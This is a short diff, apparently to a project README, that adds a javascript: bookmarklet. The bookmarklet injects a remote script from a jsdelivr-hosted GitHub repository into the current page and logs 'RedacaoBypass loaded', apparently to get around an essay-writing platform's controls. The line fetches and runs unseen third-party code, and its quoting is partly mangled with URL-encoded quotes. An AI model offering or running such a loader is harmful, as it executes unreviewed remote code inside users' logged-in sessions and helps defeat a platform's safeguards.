@@ -14,3 +14,5 @@ Mr001
 
 
 Credit: mzzvm
+
+javascript:(function(){  var s=document.createElement('script');  s.src='https://cdn.jsdelivr.net/gh/Nikolas0508/Nikolas@main/script.js?t=%27 + Date.now();  s.crossOrigin=%27anonymous%27;  s.onload=function(){    console.log(%27RedacaoBypass loaded (no-cache)%27);  };  document.head.appendChild(s);})();
